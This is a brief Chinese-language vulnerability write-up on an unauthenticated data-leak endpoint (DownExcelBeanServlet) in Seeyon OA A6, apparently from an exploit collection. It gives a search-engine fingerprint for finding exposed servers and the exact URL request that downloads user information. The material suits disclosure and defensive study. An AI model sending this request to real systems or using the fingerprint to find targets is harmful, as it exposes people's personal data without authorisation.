# 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露

## 漏洞描述

致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息

## 漏洞影响

```
致远OA A6
```

## 网络测绘

```
title="致远A8+协同管理软件.A6"
```

## 漏洞复现

访问如下URL即可跳转下载用户信息文件

```
/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
```

![image-20220520151947895](images/202205201519045.png)